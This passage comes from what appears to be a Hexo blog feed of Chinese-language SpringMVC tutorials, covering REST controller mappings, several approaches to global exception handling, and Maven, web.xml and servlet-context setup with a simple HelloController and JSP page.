class="meta">@DeleteMapping(&quot;/account/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteAccountById</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> accountService.delete(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="更新操作"><a href="#更新操作" class="headerlink" title="更新操作"></a>更新操作</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping(&quot;/account/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateAccount</span><span class="params">(<span class="meta">@RequestBody</span> Account account, Integer id)</span> &#123;</span><br><span class="line">    account.setId(id);</span><br><span class="line">    <span class="keyword">return</span> accountService.update(account,id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加操作"><a href="#添加操作" class="headerlink" title="添加操作"></a>添加操作</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/account&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAccount</span><span class="params">(<span class="meta">@RequestBody</span> Account account)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> accountService.add(account);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="全局异常处理"><a href="#全局异常处理" class="headerlink" title="全局异常处理"></a>全局异常处理</h2><p>SpringMVC 对于异常处理这块提供了支持，通过 SpringMVC 提供的全局异常处理机制，能够将所有类型的异常处理从各处理过程解耦出来，既保证了相关处理过程的功能较单一，也实现了异常信息的统一处理和维护</p><h3 id="使用SimpleMappingExceptionResolver对象"><a href="#使用SimpleMappingExceptionResolver对象" class="headerlink" title="使用SimpleMappingExceptionResolver对象"></a>使用<code>SimpleMappingExceptionResolver</code>对象</h3><p>配置文件中配置异常处理对象</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置全局异常统一处理的 Bean （简单异常处理器） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.handler.SimpleMappingExceptionResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 页面在转发时出现异常，设置默认的错误页面（error代表的是一个视图） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;defaultErrorView&quot;</span> <span class="attr">value</span>=<span class="string">&quot;error&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 异常发生时，设置异常的变量名 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;exceptionAttribute&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ex&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>error.jsp</code>中，可以使用<code>${ex}</code>在前端页面打印异常信息。</p><p>此外，也可以自定义异常抛出并定位到相应页面</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 设置自定义异常和页面的映射 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;exceptionMappings&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;path.to.your.exception1&quot;</span>&gt;</span>exception1<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;path.to.your.exception2&quot;</span>&gt;</span>exception2<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置成功若抛出<code>exception1</code>则会跳转到<code>exception1.jsp</code>页面</p><h3 id="实现HandlerExceptionResolver接口"><a href="#实现HandlerExceptionResolver接口" class="headerlink" title="实现HandlerExceptionResolver接口"></a>实现<code>HandlerExceptionResolver</code>接口</h3><p>接口定义</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HandlerExceptionResolver</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    ModelAndView <span class="title function_">resolveException</span><span class="params">(HttpServletRequest request, HttpServletResponse response, <span class="meta">@Nullable</span> Object handler, Exception ex)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写处理类，使用<code>@Component</code>导入IOC容器，与异常绑定</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionResolver</span> <span class="keyword">implements</span> <span class="title class_">HandlerExceptionResolver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">resolveException</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object handler, Exception ex )</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        mv.addObject(<span class="string">&quot;ex&quot;</span>, <span class="string">&quot;Error Message&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用if判断设置自定义异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionResolver</span> <span class="keyword">implements</span> <span class="title class_">HandlerExceptionResolver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">resolveException</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object handler, Exception ex )</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        mv.addObject(<span class="string">&quot;ex&quot;</span>, <span class="string">&quot;Error Message&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(ex <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">            mv.setViewName(<span class="string">&quot;IOExceptionPage&quot;</span>);</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> (IOException) ex;</span><br><span class="line">            mv.addObject(<span class="string">&quot;ex&quot;</span>,e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Controller类继承BaseController"><a href="#Controller类继承BaseController" class="headerlink" title="Controller类继承BaseController"></a>Controller类继承<code>BaseController</code></h3><p>作为其他 Controller 的父类，提供公共的异常处理、日志记录、权限检查等方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseController</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exc</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Exception ex)</span> &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;ex&quot;</span>, ex);</span><br><span class="line">        <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> ParamsException) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error_param&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> BusinessException) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error_business&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>@ExceptionHandler</code> 注解实现异常处理，具有集成简单、有扩展性好（只需要将要异常处理的 Controller 类继承于 <code>BaseController</code> 即可）、不需要附加 Spring 配置等优点，但该方法对已有代码存在入侵性（需要修改已有代码，使相关类继承于 BaseController），在异常处理时不能获取除异常以外的数据</p><h3 id="未捕获异常处理"><a href="#未捕获异常处理" class="headerlink" title="未捕获异常处理"></a>未捕获异常处理</h3><p>未捕获异常导致的404、500等错误页面可通过修改<code>web.xml</code>进行全局的配置</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 出错页面定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exception-type</span>&gt;</span>java.lang.Throwable<span class="tag">&lt;/<span class="name">exception-type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/500.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/500.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> 简易开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVC第一部分</title>
      <link href="/2025/12/29/SpringMVC%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/"/>
      <url>/2025/12/29/SpringMVC%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringMVC第一部分"><a href="#SpringMVC第一部分" class="headerlink" title="SpringMVC第一部分"></a>SpringMVC第一部分</h1><p>MVC( Model-View-Controller )是一种程序设计思想，通过分离模型、视图和控制器在应用中的角色实现解耦，MVC允许各个组分单独改变而不会相互影响</p><br/><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="配置流程"><a href="#配置流程" class="headerlink" title="配置流程"></a>配置流程</h3><p>配置依赖项与构建项<code>pom.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- spring web --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- spring mvc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- web servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 编译环境插件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- jetty插件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.4.27.v20200227<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scanIntervalSeconds</span>&gt;</span>10<span class="tag">&lt;/<span class="name">scanIntervalSeconds</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 设置端口 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">httpConnector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">port</span>&gt;</span>8080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">httpConnector</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 设置项目路径 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">webAppConfig</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">contextPath</span>&gt;</span>/path<span class="tag">&lt;/<span class="name">contextPath</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">webAppConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置<code>web.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">id</span>=<span class="string">&quot;webApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 编码过滤 utf-8 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>char encoding filter<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- servlet请求分发器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:servlet-context.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 表示启动容器时初始化该Servlet --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这是拦截请求， &quot;/&quot;代表拦截所有请求， &quot;*.do&quot;拦截所有.do请求 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;url-pattern&gt;/&lt;/url-pattern&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.do<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>servlet请求分发由<code>servlet-context.xml</code>配置，接下来配置该文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启扫描器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.xxxx.springmvc.controller&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 使用默认的Servlet来响应静态文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 开启注解驱动 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 配置视图解析器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span> <span class="attr">id</span>=<span class="string">&quot;internalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 前缀：在WEB-INF目录下的jsp目录下 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/jsp/&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 后缀：以.jsp结尾的资源 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>编写页面控制器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求映射地址 /hello.do</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        mv.addObject(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;hello spring mvc&quot;</span>);</span><br><span class="line">        mv.setViewName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>WEB-INF</code>目录下新建<code>jsp</code>文件夹，新建<code>hello.jsp</code></p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">basePath</span> <span class="operator">=</span> </span><br><span class="line">        request.getScheme() + <span class="string">&quot;://&quot;</span> + </span><br><span class="line">        request.getServerName() + <span class="string">&quot;:&quot;</span> + </span><br><span class="line">        request.getServerPort() + path + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;base href=<span class="string">&quot;&lt;%=basePath %&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;My JSP <span class="string">&#x27;hello.jsp&#x27;</span> starting page&lt;/title&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;pragma&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;expires&quot;</span> content=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;keyword1,keyword2,keyword3&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;This is my page&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- EL表达式接收参数值 --&gt;</span><br><span class="line">    $&#123;hello&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>启动jetty服务器即可</p><br/><h2 id="URL地址映射"><a href="#URL地址映射" class="headerlink" title="URL地址映射"></a>URL地址映射</h2><p>通过注解<code>@RequestMapping</code> 将请求地址与方法进行绑定，可以在类级别和方法级别声明。类级别的注解负责将一个特定的请求路径映射到一个控制器上，将url和类绑定；通过方法级别的注解可以细化映射，能够将一个特定的请求路径映射到某个具体的方法上，将url和类的方法绑定</p><h3 id="映射单个URL"><a href="#映射单个URL" class="headerlink" title="映射单个URL"></a>映射单个URL</h3><p>使用<code>@RequestMapping(&quot;&quot;)</code>或指定<code>value</code>属性 </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span 